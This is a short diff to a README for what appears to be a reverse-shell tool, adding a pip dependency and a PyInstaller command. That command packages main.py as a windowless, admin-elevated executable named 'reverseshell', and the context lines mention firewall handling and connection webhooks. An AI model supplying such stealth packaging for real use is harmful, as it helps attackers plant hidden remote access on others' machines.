@@ -8,5 +8,11 @@ Disclaimer this is for educational purposes only, use this in controlled environ
 - Auto firewall shit
 - optional webhook messaging every time the client connects to the server
 
-## misc ##
+# PIP #
+`pip install requests`
+
+## Optional ##
+Pyinstaller: `pyinstaller --onefile --noconsole --uac-admin --hidden-import=requests --name=reverseshell main.py`
+
+## Misc ##
 thanks for using my scripts love yall so much have fun!
